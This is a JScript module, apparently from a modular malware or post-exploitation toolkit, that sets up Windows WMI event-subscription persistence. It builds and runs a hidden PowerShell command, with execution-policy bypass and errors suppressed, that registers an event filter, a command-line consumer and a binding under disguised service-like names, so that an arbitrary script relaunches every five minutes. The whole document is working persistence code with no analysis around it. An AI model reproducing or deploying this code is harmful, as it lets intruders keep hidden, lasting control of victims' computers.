// chunk: persist/wmi_event
// depends: core/run_cmd
// provides: persist_wmi
// format: jscript

function persist_wmi(scriptPath) {
    var filterName = "SvcFilter_" + Math.floor(Math.random() * 99999);
    var consumerName = "SvcConsumer_" + Math.floor(Math.random() * 99999);
    var ps = "$f=[wmiclass]'ROOT\\\\subscription:__EventFilter';";
    ps += "$fi=$f.CreateInstance();";
    ps += "$fi.Name='" + filterName + "';";
    ps += "$fi.EventNamespace='root\\\\cimv2';";
    ps += "$fi.QueryLanguage='WQL';";
    ps += "$fi.Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"';";
    ps += "$fi.Put();";
    ps += "$c=[wmiclass]'ROOT\\\\subscription:CommandLineEventConsumer';";
    ps += "$ci=$c.CreateInstance();";
    ps += "$ci.Name='" + consumerName + "';";
    ps += "$ci.CommandLineTemplate='cscript //nologo //E:jscript \\\"" + scriptPath + "\\\"';";
    ps += "$ci.Put();";
    ps += "$b=[wmiclass]'ROOT\\\\subscription:__FilterToConsumerBinding';";
    ps += "$bi=$b.CreateInstance();";
    ps += "$bi.Filter=$fi.__PATH;";
    ps += "$bi.Consumer=$ci.__PATH;";
    ps += "$bi.Put()";
    var r = _run("powershell -Ep Bypass -W Hidden -C \"" + ps + "\" 2>NUL");
    emit("  [*] WMI event persistence: " + filterName + "\r\n");
    return filterName;
}
